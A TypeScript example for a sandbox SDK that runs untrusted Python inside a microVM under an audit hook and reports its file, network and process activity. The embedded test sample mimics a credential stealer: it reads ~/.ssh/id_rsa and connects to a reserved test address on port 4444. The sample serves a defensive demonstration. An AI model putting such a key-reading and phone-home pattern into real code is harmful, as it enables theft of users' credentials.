/**
 * Sandbox: see what untrusted code DOES before you trust it.
 *
 * Runs an untrusted script in a fresh microVM under a Python audit hook
 * (sys.addaudithook, built into 3.8+), so every file open, network connection,
 * and subprocess is captured — with no tools to install in the VM. This is the
 * core of a "run it somewhere safe and tell me if it's sketchy" workflow.
 *
 * Built into a full tool (npm/PyPI scanning, AI verdicts, web UI):
 *   https://github.com/Vinay152003/saferun  ·  https://saferun-ten.vercel.app
 */
import { SolariClient } from "@solarisdk/sdk"

// The untrusted code we want to vet. This one behaves like a credential stealer:
// it reads an SSH key and tries to phone home. Harmless here — the key is absent
// and the address is a reserved TEST-NET IP that goes nowhere.
const UNTRUSTED = `
import os, socket
try:
    open(os.path.expanduser("~/.ssh/id_rsa")).read()
except OSError:
    pass
try:
    socket.create_connection(("203.0.113.10", 4444), 0.5)
except OSError:
    pass
print("hello from the untrusted script")
`

// The harness runs the target under an audit hook and prints a JSON trace after
// a marker. File opens under the Python install dir are filtered out as noise.
const HARNESS = `
import sys, json, io, runpy, traceback
EV = []
STD = tuple(p for p in (sys.prefix, sys.base_prefix) if p)
def noisy(p):
    return isinstance(p, str) and (p.startswith(STD) or "site-packages" in p or p == "/tmp/target.py")
def hook(event, args):
    cat = None
    if event == "open":
        if noisy(args[0] if args else ""): return
        cat = "file"
    elif event == "socket.__new__":
        return
    elif event.startswith(("socket.", "urllib.")):
        cat = "network"
    elif event.startswith(("subprocess.", "os.exec")) or event == "os.system":
        cat = "process"
    if cat:
        EV.append({"category": cat, "event": event, "detail": ", ".join(repr(a)[:80] for a in args)})
sys.addaudithook(hook)
buf, real = io.StringIO(), sys.stdout
sys.stdout = buf
err = None
try:
    runpy.run_path("/tmp/target.py", run_name="__main__")
except SystemExit:
    pass
except BaseException:
    err = traceback.format_exc()
finally:
    sys.stdout = real
print("@@TRACE@@" + json.dumps({"events": EV, "stdout": buf.getvalue(), "error": err}))
`

const pt = new SolariClient({ apiKey: process.env.SOLARI_API_KEY! })

const sandbox = await pt.sandboxes.create({
  template: "base",
  // Rolling IDLE window — it resets on every use, it is not a hard deadline.
  timeoutMs: 5 * 60_000,
})
console.log("sandbox:", sandbox.sandboxId)

try {
  await sandbox.connect()
  await sandbox.files.write("/tmp/target.py", UNTRUSTED)
  await sandbox.files.write("/tmp/harness.py", HARNESS)

  // Run the harness, never the target directly — the harness installs the audit
  // hook first, then executes the untrusted code.
  const out = await sandbox.commands.run("python3", { args: ["/tmp/harness.py"] })

  const marker = out.stdout.lastIndexOf("@@TRACE@@")
  const trace = JSON.parse(out.stdout.slice(marker + "@@TRACE@@".length)) as {
    events: { category: string; event: string; detail: string }[]
    stdout: string
    error: string | null
  }

  const icon: Record<string, string> = { file: "📄", network: "🌐", process: "⚙️" }
  console.log(`\nwhat the untrusted code did (${trace.events.length} sensitive action(s)):`)
  for (const e of trace.events) {
    console.log(`  ${icon[e.category] ?? "•"} ${e.event}  ${e.detail}`)
  }
  console.log("\nits own output:", trace.stdout.trim())
} finally {
  // kill() destroys the VM. close() alone would leave it running until the idle timeout.
  await sandbox.kill()
}
